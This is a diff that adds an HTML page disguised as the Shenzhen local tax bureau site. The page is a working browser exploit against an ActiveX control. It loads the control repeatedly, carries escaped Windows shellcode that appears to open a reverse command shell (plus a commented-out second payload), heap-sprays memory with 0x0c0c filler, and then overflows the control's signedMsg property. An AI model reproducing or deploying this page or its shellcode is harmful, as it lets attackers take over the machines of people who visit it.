@@ -1,0 +1,48 @@
+<html>
+<head><TITLE>深圳市地方税务局</TITLE></head>
+<body background="bg.png">
+<object id='obj' classid='CLSID:{62B938C4-4190-4F37-8CF0-A92B0A91CC77}'></object>
+<object id='obj1' classid='CLSID:{62B938C4-4190-4F37-8CF0-A92B0A91CC77}'></object>
+<object id='obj2' classid='CLSID:{62B938C4-4190-4F37-8CF0-A92B0A91CC77}'></object>
+<object id='obj3' classid='CLSID:{62B938C4-4190-4F37-8CF0-A92B0A91CC77}'></object>
+<object id='obj4' classid='CLSID:{62B938C4-4190-4F37-8CF0-A92B0A91CC77}'></object>
+<object id='obj5' classid='CLSID:{62B938C4-4190-4F37-8CF0-A92B0A91CC77}'></object>
+<object id='obj6' classid='CLSID:{62B938C4-4190-4F37-8CF0-A92B0A91CC77}'></object>
+<script>
+var shellcode = unescape('%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u8b14%u2872'+
+'%ub70f%u264a%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752'+
+'%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058'+
+'%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475'+
+'%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3'+
+'%u8b04%ud001%u4489%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86'+
+'%u3368%u0032%u6800%u7377%u5f32%u6854%u774c%u0726%ud5ff%u90b8%u0001%u2900'+
+'%u54c4%u6850%u8029%u006b%ud5ff%u5050%u5050%u5040%u5040%uea68%udf0f%uffe0'+
+'%u89d5%u68c7%ua8c0%u0104%u0268%u1100%u895c%u6ae6%u5610%u6857%ua599%u6174'+
+'%ud5ff%u6368%u646d%u8900%u57e3%u5757%uf631%u126a%u5659%ufde2%uc766%u2444'+
+'%u013c%u8d01%u2444%uc610%u4400%u5054%u5656%u4656%u4e56%u5656%u5653%u7968'+
+'%u3fcc%uff86%u89d5%u4ee0%u4656%u30ff%u0868%u1d87%uff60%ubbd5%ub5f0%u56a2'+
+'%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff');
+//var shellcode = unescape('%uc931%ue983%ud9de%ud9ee%u2474%u5bf4%u7381%u3d13%u5e46%u8395'+ 
+//                    '%ufceb%uf4e2%uaec1%u951a%u463d%ud0d5%ucd01%u9022%u4745%u1eb1'+ 
+//                    '%u5e72%ucad5%u471d%udcb5%u72b6%u94d5%u77d3%u0c9e%uc291%ue19e'+ 
+//                    '%u873a%u9894%u843c%u61b5%u1206%u917a%ua348%ucad5%u4719%uf3b5'+ 
+//                    '%u4ab6%u1e15%u5a62%u7e5f%u5ab6%u94d5%ucfd6%ub102%u8539%u556f'+ 
+//                    '%ucd59%ua51e%u86b8%u9926%u06b6%u1e52%u5a4d%u1ef3%u4e55%u9cb5'+ 
+//                    '%uc6b6%u95ee%u463d%ufdd5%u1901%u636f%u105d%u6dd7%u86be%uc525'+ 
+//                    '%u3855%u7786%u2e4e%u6bc6%u48b7%u6a09%u25da%uf93f%u465e%u955e'); 
+var bigblock = unescape('%u0c0c%u0c0c');
+var headersize = 20;
+var slackspace = headersize + shellcode.length;
+while (bigblock.length < slackspace) bigblock += bigblock;
+var fillblock = bigblock.substring(0,slackspace);
+var block = bigblock.substring(0,bigblock.length - slackspace);
+while (block.length + slackspace < 0x40000) block = block + block + fillblock;
+var memory = new Array();
+for (i = 0; i < 500; i++){ memory[i] = block + shellcode }
+s="\x0c\x0c\x0c\x0c";
+while(s.length<1024)s+=s;
+obj3.signedMsg = "1024 "+s;
+obj4.IsCertExists("aa");
+</script>
+</body>
+</html>
